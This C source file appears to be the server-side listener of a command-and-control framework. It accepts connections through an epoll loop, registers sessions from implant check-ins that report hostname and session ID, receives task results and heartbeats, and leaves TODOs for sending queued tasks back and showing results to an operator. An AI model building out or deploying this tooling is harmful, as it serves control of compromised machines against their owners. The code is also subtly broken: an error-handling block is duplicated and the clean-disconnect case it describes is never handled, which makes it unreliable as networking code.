#include "listener.h"
#include "config.h"
#include "logging.h"
#include "protocol.h"

#include "session.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <unistd.h>

#define MAX_EVENTS 64

typedef struct {
    int fd;
    recv_buf_t rbuf;
    session_t *session;
} client_t;

static struct {
    int epoll_fd;
    int listen_fd;
    client_t clients[MAX_SESSIONS];
    bool running;
} state;

static int set_nonblocking(int fd);
static int create_listen_socket(uint16_t port);
static void handle_accept(void);
static void handle_client_data(client_t *c);
static void handle_message(client_t *c, msg_header_t *hdr, const uint8_t *body, uint32_t body_len);

/*  Socket needs to be non-blocking
    fcntl with O_NONBLOCK since EPoll
    with blocking socets could cause error*/

// Make a socket non-blocking
// To prevent getting stuck on accept or recv
static int set_nonblocking(int fd) {
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags == -1) {
        LOG_ERROR("fcntl F_GETFL: %s", strerror(errno));
        return -1;
    }
    if (fcntl(fd, F_SETFL, flags | O_NONBLOCK) == -1) {
        LOG_ERROR("fcntl F_SETFL: %s", strerror(errno));
        return -1;
    }
    return 0;
}

// Create bind and listen socket
static int create_listen_socket(uint16_t port) {

    state.listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (state.listen_fd < 0) {
        LOG_ERROR("socket: %s", strerror(errno));
        return -1;
    }
    LOG_DEBUG("State.listen_fd: %d", state.listen_fd);

    int opt = 1;
    // Prevents address already in use error when restarting
    setsockopt(state.listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // Non-blocking
    set_nonblocking(state.listen_fd);

    // Bind fd to ip and port
    struct sockaddr_in addr = {
        .sin_family = AF_INET, .sin_port = htons(port), .sin_addr.s_addr = INADDR_ANY};

    if (bind(state.listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        LOG_ERROR("create_listen_socket: bind failed %s", strerror(errno));
        close(state.listen_fd);
        return -1;
    }

    if (listen(state.listen_fd, 128) < 0) {
        LOG_ERROR("create_listen_socket: listen failed %s", strerror(errno));
        close(state.listen_fd);
        return -1;
    }
    LOG_INFO("listening on port: %u", port);
    return 0; // success
}

int listener_init(uint16_t port) {

    memset(&state.clients, 0, sizeof(state.clients));
    for (int i = 0; i < MAX_SESSIONS; i++) {
        state.clients[i].fd = -1;
    }

    LOG_DEBUG("listener_init: memset 0 and fd init to -1");

    if (create_listen_socket(port) < 0) {
        return -1;
    }

    // Epoll instance
    state.epoll_fd = epoll_create1(0);
    if (state.epoll_fd < 0) {
        LOG_ERROR("create_listen_socket: epoll failed %s", strerror(errno));
        return -1;
    }

    struct epoll_event ev;
    ev.events = EPOLLIN;
    ev.data.ptr = NULL; // Listener NULL
    epoll_ctl(state.epoll_fd, EPOLL_CTL_ADD, state.listen_fd, &ev);
    LOG_DEBUG("epoll_fd=%d, listen_fd=%d", state.epoll_fd, state.listen_fd);

    state.running = true;
    return 0;
}

// Find free slot and init new client
static void handle_accept(void) {
    while (1) {
        int new_fd = accept(state.listen_fd, NULL, NULL);
        if (new_fd < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                break; // no more pending connection
            }
            LOG_ERROR("accept: %s", strerror(errno));
            break;
        }

        set_nonblocking(new_fd);

        // Find a free slot in state.clients (fd == -1)
        int free_slot = -1;
        for (int i = 0; i < MAX_SESSIONS; i++) {
            if (state.clients[i].fd == -1) {
                free_slot = i;
                break;
            }
        }

        // No free slot
        if (free_slot == -1) {
            LOG_WARN("no free slot, rejecting connection fd=%d", new_fd);
            close(new_fd);
            continue; // Drain all pending connection
        }

        // Init slot
        state.clients[free_slot].fd = new_fd;
        recv_buf_reset(&state.clients[free_slot].rbuf);
        state.clients[free_slot].session = NULL;

        struct epoll_event ev;
        ev.events = EPOLLIN;
        ev.data.ptr = &state.clients[free_slot];
        epoll_ctl(state.epoll_fd, EPOLL_CTL_ADD, new_fd, &ev);

        LOG_INFO("new connection fd=%d slot=%d", new_fd, free_slot);
    }
}

static void handle_client_data(client_t *c) {

    // Level triggered epoll; no loop needed for grabing bytes
    ssize_t n = recv(c->fd, c->rbuf.buf + c->rbuf.len, MAX_MSG_SIZE - c->rbuf.len, 0);

    // if recv returns 0; clean disconnect
    if (n < 0) {
        if (errno == EAGAIN) {
            return;
        }
        LOG_ERROR("recv fd=%d: %s", c->fd, strerror(errno));
        if (c->session) {
            c->session->state = SESSION_DISCONNECTED;
        }
        epoll_ctl(state.epoll_fd, EPOLL_CTL_DEL, c->fd, NULL);
        close(c->fd);
        c->fd = -1;
        c->session = NULL;
        return;
    }

    if (n < 0) {
        if (errno == EAGAIN) {
            return;
        }

        LOG_ERROR("recv fd=%d: %s", c->fd, strerror(errno));
        epoll_ctl(state.epoll_fd, EPOLL_CTL_DEL, c->fd, NULL);
        close(c->fd);
        c->fd = -1;
        return;
    }

    c->rbuf.len += n;
    LOG_DEBUG("recv fd=%d: %zd bytes, rbuf now %zu", c->fd, n, c->rbuf.len);

    msg_header_t hdr;
    const uint8_t *body;
    uint32_t body_len;

    // try parse and check for message type
    while (protocol_try_parse(&c->rbuf, &hdr, &body, &body_len)) {
        handle_message(c, &hdr, body, body_len);
    }
}

// Check implant -> server messages types
static void handle_message(client_t *c, msg_header_t *hdr, const uint8_t *body, uint32_t body_len) {
    switch (hdr->msg_type) {
    case MSG_CHECKIN: {
        uint64_t session_id;
        char hostname[MAX_HOSTNAME_LEN];
        uint32_t hostname_len;

        if (protocol_unpack_checkin(body, body_len, &session_id, hostname, &hostname_len) < 0) {
            LOG_ERROR("bad checkin from fd=%d", c->fd);
            return;
        }

        // Try to find existing session (reconnect case)
        session_t *sess = session_find(session_id);
        if (sess) {
            // Reconnect — existing session checking back in
            sess->state = SESSION_ACTIVE;
            session_touch(sess);
            LOG_INFO("session reconnected: id=%llu hostname=%s", (unsigned long long)session_id,
                     sess->hostname);
        } else {
            // New session
            sess = session_create(session_id, hostname);
            if (!sess) {
                LOG_ERROR("session_create failed for fd=%d (table full?)", c->fd);
                // Disconnect the client — we can't track them
                epoll_ctl(state.epoll_fd, EPOLL_CTL_DEL, c->fd, NULL);
                close(c->fd);
                c->fd = -1;
                return;
            }
            sess->state = SESSION_ACTIVE;
        }

        // Link the connection to the session
        c->session = sess;

        // TODO: pack checkin_ack + queued task, send back
        break;
    }
    case MSG_RESULT: {
        task_type_t type;
        int32_t status;
        uint8_t data[MAX_MSG_SIZE];
        uint32_t data_len;

        if (protocol_unpack_result(body, body_len, &type, &status, data, &data_len) < 0) {
            LOG_ERROR("bad result from fd=%d", c->fd);
            return;
        }

        if (c->session) {
            session_touch(c->session);
        }

        // TODO: update task state, display to operator
        break;
    }
    case MSG_HEARTBEAT: {
        if (c->session) {
            session_touch(c->session);
            LOG_DEBUG("heartbeat from session=%llu", (unsigned long long)c->session->id);
        } else {
            LOG_WARN("heartbeat before checkin from fd=%d", c->fd);
        }
        break;
    }
    default: {
        LOG_WARN("unknown msg_type=%d from fd=%d", hdr->msg_type, c->fd);
        break;
    }
    }
}

void listener_run(void) {
    struct epoll_event events[MAX_EVENTS];
    LOG_INFO("event loop started");
    while (state.running) {
        int n = epoll_wait(state.epoll_fd, events, MAX_EVENTS, -1);
        if (n < 0) {
            if (errno == EINTR)
                continue; // signal, retry
            LOG_ERROR("epoll_wait: %s", strerror(errno));
            break;
        }
        for (int i = 0; i < n; i++) {
            // if data.ptr == NULL → handle_accept()
            //
            if (events[i].data.ptr == NULL) {
                // Listen_fd assigned NULL
                handle_accept();
            } else {
                // Existing connection
                handle_client_data((client_t *)events[i].data.ptr);
            }
        }
    }
}

void listener_shutdown(void) {
    state.running = false;
    int count = 0;
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (state.clients[i].fd != -1) {
            count++;
            close(state.clients[i].fd);
        }
    }
    close(state.epoll_fd);
    close(state.listen_fd);
    LOG_INFO("shutting down, closing %d connections", count);
}
